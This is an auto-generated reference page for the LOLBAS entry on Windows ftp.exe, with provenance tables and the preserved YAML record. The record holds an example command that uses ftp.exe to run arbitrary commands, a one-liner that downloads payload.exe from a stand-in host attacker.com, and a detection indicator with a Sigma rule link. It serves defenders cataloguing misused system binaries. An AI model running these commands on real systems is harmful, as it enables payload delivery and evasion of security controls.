---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Ftp.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `ftp.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ftp.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Ftp.exe](../../tools/windows/ftp.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ftp.exe |
| name | Ftp.exe |
| type | tool |
| source | lolbas |
| url | https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Handle: ''
  Person: BennyHusted
- Handle: '@0xAmit'
  Person: Amit Serper
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
  Description: Executes the commands you put inside the text file.
  MitreID: T1202
  OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
- Category: Download
  Command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo
    binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
  Description: Download
  MitreID: T1105
  OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
Created: 2018-12-10
Description: A binary designed for connecting to FTP servers
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml
- IOC: cmd /c as child process of ftp.exe
Full_Path:
- Path: C:\Windows\System32\ftp.exe
- Path: C:\Windows\SysWOW64\ftp.exe
Name: Ftp.exe
Resources:
- Link: https://twitter.com/0xAmit/status/1070063130636640256
- Link: https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939
- Link: https://ss64.com/nt/ftp.html
- Link: https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ftp.yml
```

## Detection / Analysis Notes

```text
IOC: cmd /c as child process of ftp.exe
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml
- IOC: cmd /c as child process of ftp.exe
```
